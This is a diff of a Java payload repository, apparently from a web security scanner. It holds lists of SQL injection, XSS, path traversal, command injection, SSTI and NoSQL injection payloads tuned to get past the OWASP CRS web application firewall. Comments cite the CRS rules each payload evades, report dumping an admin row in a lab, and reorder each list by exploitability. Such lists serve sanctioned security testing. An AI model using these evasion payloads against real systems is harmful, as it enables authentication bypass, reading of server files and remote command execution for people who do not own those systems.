@@ -42,18 +42,22 @@ public class PayloadRepository {
     // Encoding / obfuscation / filter-bypass variants of the seed payloads, NOT new attack classes.
     // ponytail: heuristic bypass list. Ceiling: single-payload evasion only — no HPP, no
     // content-type tricks. Vetted 2026-08-30 against OWASP CRS 4 (Coraza/caddy-waf, PL1) as a
-    // JSON body value — every entry below returns 200, not 403, on 3/3 runs. The goal is to
-    // clear the WAF filter, not to guarantee exploitability: some entries (NoSQLi "$ ne",
-    // path overlong-UTF-8) only fire against an app that normalises the obfuscation. XSS
-    // stays weak — see its note. Re-test any edit against a live block page before relying on it.
+    // JSON body value — every entry returns 200, not 403, on 3/3 runs. The goal is to clear
+    // the WAF filter, not to guarantee exploitability: each list is ordered most-portable
+    // exploit first (index 0 is all LIGHT depth sends), then bypass-only variants that need
+    // the backend to normalise the obfuscation (double-decode, overlong UTF-8, key-trim).
+    // Re-test any edit against a live block page before relying on it.
 
+    // index 0..2 land on any SQL engine (-- is the universal comment; confirmed dumping the
+    // admin row on the lab's SQLite). #-comment entries are MySQL/MariaDB-only. Last entry
+    // needs the app to URL-decode twice.
     public static final List<String> SQLI_EVASION = Arrays.asList(
+        "admin'-- -",
+        "admin' -- ",
+        "admin'/**/-- -",
+        "admin'--+-",
         "admin' #",
         "admin'#",
-        "admin' -- ",
-        "admin'--+-",
-        "admin'/**/#",
-        "admin'/**/-- -",
         "admin'`#",
         "%2527%20OR%25201=1"
     );
@@ -62,10 +66,12 @@ public class PayloadRepository {
     // classic reflected vector cannot pass as a lone body value. AngularJS/Vue client-side
     // template injection (no parens on a blocklisted fn, no event handler) is the one class
     // that slips through AND still executes. Case-mix HTML kept last for weaker filters only.
-    // No embedded newlines (splitPayloads splits on \R).
+    // No embedded newlines (splitPayloads splits on \R). Index 0 executes in the widest range
+    // of AngularJS versions; the trailing () matters (without it the fn is built, not called).
+    // Last entry is Vue-specific.
     public static final List<String> XSS_EVASION = Arrays.asList(
+        "{{constructor.constructor(1)()}}",
         "<x>{{constructor.constructor(1)()}}",
-        "{{constructor.constructor(1)}}",
         "{{[].constructor.constructor(1)()}}",
         "{{self.constructor.constructor(1)()}}",
         "{{_openBlock.constructor(1)()}}"
@@ -74,46 +80,56 @@ public class PayloadRepository {
     // CRS 930120 flags the target filename (etc/passwd, win.ini) and 930110 the ../ token
     // separately, so a normal traversal string is doubly scored. Overlong-UTF-8 separators
     // (%c0%af, %e0%80%af, %c1%9c) aren't decoded at PL1 → both signals hidden; a single
-    // ../ segment only (two trips 930110). Double-encoded variants kept for decode-twice apps.
+    // ../ segment only (two trips 930110). None landed on the lab (its open() takes the raw
+    // string); ordered by which normalisation is commonest in the wild — double-URL-decode
+    // (proxy + framework) first, then overlong UTF-8 (classic IIS / older Tomcat).
     public static final List<String> PATH_TRAVERSAL_EVASION = Arrays.asList(
-        "..%c0%afetc%c0%afpasswd",
-        "..%e0%80%afetc%e0%80%afpasswd",
-        "..%c1%9cetc%c1%9cpasswd",
-        "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+        "%252e%252e%252fetc%252fpasswd",
         "..%25c0%25afetc%25c0%25afpasswd",
-        "%252e%252e%252fetc%252fpasswd"
+        "..%c0%afetc%c0%afpasswd",
+        "%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
+        "..%e0%80%afetc%e0%80%afpasswd",
+        "..%c1%9cetc%c1%9cpasswd"
     );
 
+    // Index 0 combines a command separator with quote-insertion (shell still parses i""d as
+    // id); ||id runs when the host command errors on the injected input (common). %0aid%0a
+    // last — needs the app to decode the newline.
     public static final List<String> CMDI_EVASION = Arrays.asList(
+        ";i\"\"d",
         "||id",
         "|id",
-        "x||id",
         "`i\\d`",
-        "%0aid%0a",
-        ";i\"\"d"
+        "x||id",
+        "%0aid%0a"
     );
 
     // Arithmetic-only on purpose: the SSTI detector only looks for "49", and an RCE
     // gadget payload (T(java.lang.Runtime)...) is exactly what a WAF signature-matches.
     // Bare ${7*7} and ${{7*7}} trip CRS; the brace/percent variants below do not.
+    // Ordered by engine prevalence: {{ }} (Jinja2/Twig/Nunjucks/Angular) first, {7*7}
+    // (ambiguous, weakest signal) last.
     public static final List<String> SSTI_EVASION = Arrays.asList(
         "{{7*7}}",
-        "{7*7}",
+        "<%=7*7%>",
         "#{7*7}",
         "@(7*7)",
-        "<%=7*7%>"
+        "{7*7}"
     );
 
     // CRS 942 matches $ directly glued to a Mongo operator keyword. One space between them
     // ("$ ne") clears the rule on 3/3 runs; a lenient JSON/BSON parser that trims the key
     // still resolves it to $ne. Trailing space ("$ne ") does NOT bypass. $comment is a real
     // operator CRS doesn't list.
+    // Index 0/1 are the ones a key-trimming parser turns into a real auth-bypass ($ne against
+    // a login filter); nested form matches how apps actually pass the filter object. $where
+    // (server-side JS) and $comment are the least likely to resolve.
     public static final List<String> NOSQLI_EVASION = Arrays.asList(
         "{\"$ ne\":null}",
+        "{\"a\":{\"$ ne\":1}}",
         "{\"$ gt\":\"\"}",
         "{\"$ regex\":\".*\"}",
         "{\"$ where\":\"1==1\"}",
-        "{\"a\":{\"$ ne\":1}}",
         "{\"$comment\":\"x\"}"
     );
 
